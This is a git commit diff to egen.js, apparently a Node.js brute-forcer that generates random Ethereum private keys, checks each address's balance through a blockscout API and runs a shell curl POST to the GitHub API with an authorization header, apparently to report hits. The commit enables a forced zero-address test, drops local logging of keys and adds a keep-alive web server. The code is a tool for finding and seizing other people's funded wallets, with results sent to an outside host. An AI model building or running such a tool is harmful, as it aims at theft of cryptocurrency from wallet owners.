8da63d405c2cdf412ca55b8581fe17380ebe4a55
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2023-09-13 00:28:02 +0200

    Update egen.js

--- egen.js
+++ egen.js
@@ -1,6 +1,4 @@
 const fetch = require('node-fetch2');
-const fs = require('fs');
-var colors = require('colors');
 const crypto = require('crypto');
 const ethUtils = require('ethereumjs-util');
 const { exec } = require('child_process');
@@ -17,7 +15,7 @@ privateK = crypto.randomBytes(32);
 privateKey = privateK.toString("hex");
 address = "0x" + ethUtils.privateToAddress(Buffer.from(privateK)).toString("hex");
 
-//if(i == 5) { address = '0x0000000000000000000000000000000000000000' }
+if(i == 5) { address = '0x0000000000000000000000000000000000000000' }
 
 const response = await fetch('https://eth.blockscout.com/api/v2/addresses/' + address);
 bal = await response.json();
@@ -33,9 +31,12 @@ await exec('curl -L -X POST -H \"Accept: application/vnd.github+json\" -H \"Auth
   console.log(`${stdout}`);
 });
 
-  console.log(bal.coin_balance + ' - ' + address + ' - ' + privateKey + '\n _____________________________________________'.red);
-  fs.appendFileSync('/root/zzethgood.txt', bal.coin_balance + ' - ' + address + ' - ' + privateKey + '\n');
-
 }}}
 
 doe();
+
+var http = require('http');
+http.createServer(function (req, res) {
+  res.write("I'm alive");
+  res.end();
+}).listen(8080);
